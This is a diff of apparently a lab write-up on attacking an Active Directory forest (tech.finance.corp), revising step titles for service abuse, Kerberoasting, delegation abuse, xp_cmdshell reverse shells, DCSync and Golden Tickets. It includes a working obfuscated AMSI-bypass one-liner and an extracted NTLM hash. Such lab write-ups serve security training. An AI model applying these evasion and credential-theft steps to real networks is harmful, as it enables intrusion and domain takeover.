@@ -495,7 +495,7 @@ mgmtsrv🖥️    TECH\techservice👤    False
 
 ### Local Privilege Escalation | Service Abuse (with PowerUp)
 
-2) **Service Abuse for Local Privilege Escalation on `studvm.tech.finance.corp`** (successful ✅)
+2) **Service Abuse on `studvm.tech.finance.corp` for Local Privilege Escalation** (successful ✅)
 
 Description: Discovered a misconfigured Windows service (`vds`) that was running as `LocalSystem` and allowed modifications to its binary path. By leveraging `PowerUp`, the service's path was temporarily replaced with a command to add `tech\studentuser` to the local Administrators group. This successfully elevated the user's privileges on `studvm.tech.finance.corp`.
 
@@ -572,7 +572,7 @@ BUILTIN\Administrators👥                   Alias            S-1-5-32-544 Manda
 
 ### Kerberoasting (with PowerView, Rubeus, John)
 
-3) **Kerberoasting Attack for Domain Lateral Movement on `dbserver31.tech.finance.corp`** (unsuccessful ❌)
+3) **Kerberoasting Attack for Domain Lateral Movement to `dbserver31.tech.finance.corp`** (unsuccessful ❌)
 
 Description: Enumerated service accounts with Service Principal Names (SPNs) and performed a Kerberoasting attack on `tech\sqlserversync` in an attempt to gain the service account password and pivot onto `dbserver31.tech.finance.corp`. Although the Kerberos TGS was successfully extracted, the password could not be cracked with multiple wordlists, implying a strong password policy.
 
@@ -688,7 +688,7 @@ Session completed.
 
 Description: Performed Active Directory enumeration to identify users or machines with Constrained Delegation enabled. The attempt to find a user account with delegation rights was unsuccessful. However, enumeration of computer accounts revealed that `tech\STUDVM$` has Constrained Delegation enabled and is allowed to delegate authentication to the CIFS service on `mgmtsrv.tech.finance.corp`. This finding was leveraged to impersonate a privileged user and enabling lateral movement onto `mgmtsrv.tech.finance.corp`.
 
-- **Find a Delegator User where Constrained Delegation is Enabled**
+- **Attempt to Find a Delegator User where Constrained Delegation is Enabled**
 
 ![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
@@ -704,7 +704,7 @@ Description: Performed Active Directory enumeration to identify users or machine
 ```
 ❌
 
-- **Find a Delegator Server where Constrained Delegation is Enabled**
+- **Identify a Delegator Server where Constrained Delegation is Enabled**
 
 ![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
@@ -758,7 +758,7 @@ dnshostname                   : studvm.tech.finance.corp
 [SNIP]
 ```
 
-- **Extract the Delegator Server AES Encryption Key Hash**
+- **Extract the Delegator Server AES Kerberos Key**
 
 ![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
@@ -788,7 +788,7 @@ SID               : S-1-5-18
 [SNIP]
 ```
 
-- **Forge an S4U TGS using the Delegator Server AES Encryption Key Hash for the CIFS Service Delegation and Leverage it to Request and Obtain a TGS for the HTTP Service**
+- **Forge an S4U TGS using the Delegator Server AES Kerberos Key for the CIFS Service Delegation and Leverage it to Request and Obtain a TGS for the HTTP Service**
 
 ![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
@@ -898,7 +898,7 @@ FullLanguage
 S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
 
-- **Extract Credentials of `techservice` and `MGMTSRV$` from Memory on `mgmtsrv.tech.finance.corp`**
+- **Extract Credentials of `tech\techservice` and `tech\MGMTSRV$` from LSASS Memory on `mgmtsrv.tech.finance.corp`**
 
 ![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)
 
@@ -1071,7 +1071,7 @@ COMPUTERNAME=MGMTSRV🖥️
 
 ### Domain Lateral Movement | OverPass-The-Hash (with Rubeus)
 
-7) **OverPass-The-Hash for Domain Lateral Movement on `techsrv30.tech.finance.corp`** (successful ✅)
+7) **OverPass-The-Hash for Domain Privilege Escalation as `tech\techservice` and Domain Lateral Movement to `techsrv30.tech.finance.corp`** (successful ✅)
 
 Description: Used the AES-256 Kerberos Key of `tech\techservice`, extracted in a previous step, to request a TGT (Ticket Granting Ticket) without needing the user's password. This was achieved using `Rubeus` to perform an OverPass-The-Hash attack. The obtained ticket was injected into a new logon session, allowing authenticated access as `tech\techservice` and enabling lateral movement to `techsrv30.tech.finance.corp`.
 
@@ -1189,7 +1189,7 @@ FullLanguage
 S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
 
-- **Extract Credentials of `databaseagent` and `TECHSRV30$` from Memory on `techsrv30.tech.finance.corp`**
+- **Extract Credentials of `tech\databaseagent` and `tech\TECHSRV30$` from LSASS Memory on `techsrv30.tech.finance.corp`**
 
 ![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)
 
@@ -1319,7 +1319,7 @@ SeCreateGlobalPrivilege                   Create global objects                 
 
 ### SQL Server `xp_cmdshell` Abuse + Domain Lateral Movement (with PowerUpSQL, Invoke-PowerShellTcpEx)
 
-10) **SQL Server `xp_cmdshell` Abuse Abuse for Domain Lateral Movement to `dbserver31.tech.finance.corp`** as `tech\sqlserversync` (successful ✅)
+10) **SQL Server `xp_cmdshell` Abuse for Domain Lateral Movement to `dbserver31.tech.finance.corp`** as `tech\sqlserversync` (successful ✅)
 
 Description: Exploited a `sysadmin`-level SQL Server instance on `dbserver31.tech.finance.corp` via `xp_cmdshell` to achieve lateral movement in the domain. Using the `tech\databaseagent` account, which held `sysadmin` privileges, we confirmed command execution capabilities and ultimately launched a PowerShell reverse shell, gaining a foothold on `dbserver31.tech.finance.corp` as `tech\sqlserversync`. This new session enables further escalation and post-exploitation actions within the environment.
 
@@ -1399,7 +1399,7 @@ VERBOSE: --------------------------------
 VERBOSE:  - Link Path to server: DBSERVER31🔗
 VERBOSE:  - Link Login: TECH\databaseagent👤
 VERBOSE:  - Link IsSysAdmin: 1📌
-VERBOSE:  - Link Count: 0📌
+VERBOSE:  - Link Count: 0❌
 VERBOSE:  - Links on this server:
 
 
@@ -1487,9 +1487,9 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 ### Domain Lateral Movement | Credential Extraction (with SafetyKatz)
 
-11) **Credential Extraction for Domain Lateral Movement** (unsuccessful ❌)
+11) **Credential Extraction on `dbserver31.tech.finance.corp`** (unsuccessful ❌)
 
-Description: Attempted to extract **credentials** from `dbserver31.tech.finance.corp` using **SafetyKatz**, but the operation failed due to insufficient privileges. Since the session was **not running in high integrity**, access to the LSASS process was restricted. This failure highlights the necessity of obtaining elevated privileges before attempting credential extraction.
+Description: Attempted to extract credentials from `dbserver31.tech.finance.corp` using `SafetyKatz`, but the operation failed due to insufficient privileges. Since the session was not running in high integrity, access to the LSASS process was restricted. This failure highlights the necessity of obtaining elevated privileges before attempting credential extraction.
 
 ![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
@@ -1518,13 +1518,13 @@ Description: Attempted to extract **credentials** from `dbserver31.tech.finance.
 
 ---
 
-### Local Privilege Escalation | Token Impersonation Abuse (with GodPotato)
+### Local Privilege Escalation | Token Impersonation Abuse (with GodPotato, netcat)
 
-12) **Token Impersonation for ocal Privilege Escalation** (successful ✅)
+12) **Token Impersonation Abuse on `dbserver31.tech.finance.corp` for Local Privilege Escalation** (successful ✅)
 
-Description: Leveraged `GodPotato`, a privilege escalation exploit that abuses **Named Pipe Token Impersonation**, to obtain **SYSTEM privileges** on `dbserver31.tech.finance.corp`. A reverse shell was established to maintain access and facilitate further post-exploitation activities.
+Description: Used `GodPotato`, an exploit leveraging Named Pipe token impersonation, to escalate privileges to `SYSTEM` on `dbserver31.tech.finance.corp`. A reverse shell was established to maintain access and facilitate further post-exploitation activities.
 
-![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\' | Get-ItemPropertyValue -Name Version`:
 ```
@@ -1578,9 +1578,9 @@ DBSERVER31🖥️
 
 ### Domain Lateral Movement | Credential Extraction (with SafetyKatz)
 
-13) **Credential Extraction for Domain Lateral Movement** (successful ✅)
+13) **Credential Extraction on `dbserver31.tech.finance.corp`** (successful ✅)
 
-Description: Executed **PowerShell logging and AMSI bypass techniques** to evade detection while performing credential extraction. Extracted **Kerberos keys** of `sqlserversync` and `DBSERVER31$` from **LSASS memory** on `dbserver31.tech.finance.corp`. These credentials will be leveraged for **lateral movement** and further privilege escalation within the domain.
+Description: Executed PowerShell logging and AMSI bypass techniques to evade detection while performing credential extraction. Extracted Kerberos keys of `tech\sqlserversync` and `tech\DBSERVER31$` from LSASS memory on `dbserver31.tech.finance.corp`. These credentials will be leveraged for lateral movement and further privilege escalation within the domain.
 
 - **Bypassing PowerShell Logging and AMSI for Evasion**
 
@@ -1601,7 +1601,7 @@ FullLanguage
 S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
 
-- **Extract Credentials of `sqlserversync` and `DBSERVER31$` from Memory on `dbserver31.tech.finance.corp`**
+- **Extract Credentials of `tech\sqlserversync` and `tech\DBSERVER31$` from LSASS Memory on `dbserver31.tech.finance.corp`**
 
 ![system | dbserver31 #>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
@@ -1659,9 +1659,9 @@ SID               : S-1-5-18
 
 ### Domain Lateral Movement | OverPass-The-Hash + DCSync (with Rubeus)
 
-14) **OverPass-The-Hash and DCSync for Domain Lateral Movement** (successful ✅)
+14) **OverPass-The-Hash for Domain Privilege Escalation as `tech\sqlserversync`** (successful ✅)
 
-Description: Executed **DCSync** attack on **tech\administrator** and **tech\krbtgt** using **Rubeus** and **SafetyKatz** to extract **Kerberos keys** (including AES-256) and **NTLM hashes**. The successful retrieval of these credentials enables **domain lateral movement** and **privilege escalation**. The **tech\krbtgt** credentials are useful for **Golden Ticket** attacks, while the **tech\administrator** credentials provide administrative access to the domain, facilitating further exploitation.
+Description: An OverPass-The-Hash approach was used to impersonate `tech\sqlserversync` by requesting a TGT with the account's AES-256 Kerberos key. Since `sqlserversync` possessed domain replication privileges, we then executed a DCSync attack on `tech\administrator` and `tech\krbtgt` to extract their AES-256 Kerberos keys and NTLM hashes. The successful retrieval of these credentials enables lateral movement and privilege escalation. Notably, the `tech\krbtgt` credentials are useful for Golden Ticket attacks, while the `tech\administrator` credentials provide administrative access to the domain, facilitating further exploitation.
 
 ![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
@@ -1858,11 +1858,11 @@ Supplemental Credentials:
 
 ---
 
-#### Domain Persistence | Golden Ticket (with Rubeus)
+### Domain Persistence | Golden Ticket (with Rubeus)
 
-15) **Golden Ticket Attack for Domain Persistence** (successful ✅)
+15) **Golden Ticket Attack for Domain Persistence and Domain Lateral Movement to `tech-dc.tech.finance.corp`** (successful ✅)
 
-Description: Leveraged the **AES-256 Kerberos key** extracted for `tech\administrator` to forge a **Golden Ticket** for the `krbtgt/tech.finance.corp` service. The ticket was generated using `Rubeus` and injected into the current session, granting **administrator-level access** to the domain. This technique allows **domain persistence**, as the forged ticket can continue to provide access to the domain services, bypassing the standard authentication mechanism.
+Description: Leveraged the AES-256 Kerberos key extracted for `tech\administrator` to forge a Golden Ticket for the `krbtgt/tech.finance.corp` service. The ticket was generated using `Rubeus` and injected into the current session, granting administrator-level access to the domain. This technique allows domain persistence, as the forged ticket can continue to provide access to the domain services, bypassing the standard authentication mechanism.
 
 ![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
@@ -1946,7 +1946,7 @@ C:\AD\Tools\Loader.exe
 1 File(s) copied
 ```
 
-`winrs -r:tech-dc cmd`:
+`winrs -r:tech-dc.tech.finance.corp cmd`:
 ```
 Microsoft Windows [Version 10.0.17763.2510]
 (c) 2018 Microsoft Corporation. All rights reserved.
@@ -1993,9 +1993,9 @@ Mandatory Label\High Mandatory Level        Label            S-1-16-12288
 
 ### Domain Lateral Movement | Credential Extraction (with SafetyKatz)
 
-16) **Credential Extraction for Domain Lateral Movement** (successful ✅)
+16) **Credential Extraction on `tech-dc.tech.finance.corp`** (successful ✅)
 
-Description: Leveraged **SafetyKatz** to extract **NTLM hashes** from **LSASS memory** on `tech-dc.tech.finance.corp`. Extracted credentials include the **NTLM hashes** of high-privileged accounts such as `Administrator` and `krbtgt`. These credentials can be used for **domain lateral movement**, **escalating privileges**, and maintaining **domain persistence**.
+Description: Extracted credentials include the NTLM hashes of high-privileged accounts such as `tech\administrator` and `tech\krbtgt` from LSASS memory on `tech-dc.tech.finance.corp`. These credentials can be used for domain lateral movement, escalating privileges, and maintaining domain persistence.
 
 ![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_hfs_safetykatz.png)
 
@@ -2081,9 +2081,9 @@ NTLM : 862f4b5c687b92f464576a572b5214e6
 
 ### Cross Trust Attacks | Child Domain `krbtgt` Kerberos Key Abuse (with PowerView, Rubeus, SafetyKatz)
 
-17) **Child Domain `krbtgt` Kerberos Key Abuse for Domain Privilege Escalation and Lateral Movement** (successful ✅)
+17) **Child Domain `krbtgt` Kerberos Key Abuse and Domain Lateral Movement to `finance-dc.finance.corp`** (successful ✅)
 
-Description: Abused the child domain `krbtgt` TGT encryption key from `tech.finance.corp` to forge a **Golden Ticket** that includes the **Enterprise Admin** SID in its **SID History**. Leveraging this forged ticket enabled **cross-domain privilege escalation** and domain **lateral movement**, ultimately granting **administrative access** on `finance-dc.finance.corp` and facilitating further exploitation within the **root domain**.
+Description: Abused the child domain `krbtgt` TGT encryption key from `tech.finance.corp` to forge a Golden Ticket that includes the Enterprise Admin SID in its SID History. Leveraging this forged ticket enabled cross-domain privilege escalation and domain lateral movement, ultimately granting administrative access on `finance-dc.finance.corp` and facilitating further exploitation within the root domain `finance.corp`.
 
 - **Forge a Golden Ticket (with EA SID History) using the Child DC's `krbtgt` TGT Encryption Key**
 
@@ -2140,7 +2140,7 @@ S-1-5-21-1712611810-3596029332-2671080496-519📌
 [+] Ticket successfully imported!🎟️
 ```
 
-- **Leverage the Forged Ticket to Gain EA Access to the Parent DC**
+- **Leverage the Forged Ticket to Gain Enterprise Administrator Access and Remote Control to the Parent DC**
 
 `klist`:
 ```
@@ -2206,9 +2206,9 @@ COMPUTERNAME=FINANCE-DC🖥️
 
 ### Domain Lateral Movement | Credential Extraction (with SafetyKatz)
 
-18) **Credential Extraction for Domain Lateral Movement** (successful ✅)
+18) **Credential Extraction on `finance-dc.finance.corp`** (successful ✅)
 
-Description: Extracted the **NTLM hashes** of all the domain accounts from **LSASS memory** on `finance-dc.finance.corp`. These credentials can be leveraged for **lateral movement** and further privilege escalation within the **root domain**.
+Description: Extracted the NTLM hashes of all the domain accounts from LSASS memory on `finance-dc.finance.corp`. These credentials can be leveraged for lateral movement and further privilege escalation within the root domain `finance.corp`.
 
 ![finance-dc | administrator #>](https://custom-icon-badges.demolab.com/badge/finance--dc-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
